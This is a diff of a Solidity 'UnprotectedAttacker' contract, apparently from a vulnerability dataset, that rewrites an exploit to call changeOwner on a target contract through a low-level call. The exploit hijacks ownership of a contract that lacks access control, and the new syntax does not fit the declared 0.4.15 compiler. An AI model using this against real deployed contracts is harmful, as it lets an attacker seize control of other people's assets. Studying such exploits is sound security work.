@@ -1,17 +1,17 @@
  pragma solidity ^0.4.15;
 
- import "../dataset/access_control/unprotected0.sol";
-
  contract UnprotectedAttacker{
     
-    Unprotected target;
+    address target;
 
     constructor(address _target) public {
-        target = Unprotected(_target);
+        target = _target;
     }
 
     function attack(address newOwner) public {
-        target.changeOwner(newOwner);
+        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("changeOwner(address)")), newOwner);
+        (bool success, ) = target.call(data);
+        require(success, "Call failed");
     }
 
  }
